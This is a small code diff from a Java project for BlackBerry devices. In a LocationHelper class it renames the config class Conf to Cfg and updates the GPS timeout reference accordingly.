@@ -16,7 +16,7 @@ import javax.microedition.location.LocationProvider;
 
 import net.rim.device.api.system.Application;
 import net.rim.device.api.system.RuntimeStore;
-import blackberry.config.Conf;
+import blackberry.config.Cfg;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 
@@ -89,7 +89,7 @@ public final class LocationHelper {
                         //#ifdef DEBUG
                         debug.trace("getLocation");
                         //#endif
-                        final Location loc = lp.getLocation(Conf.GPS_TIMEOUT);
+                        final Location loc = lp.getLocation(Cfg.GPS_TIMEOUT);
                         callback.newLocation(loc);
                     }
                 } catch (final LocationException e) {
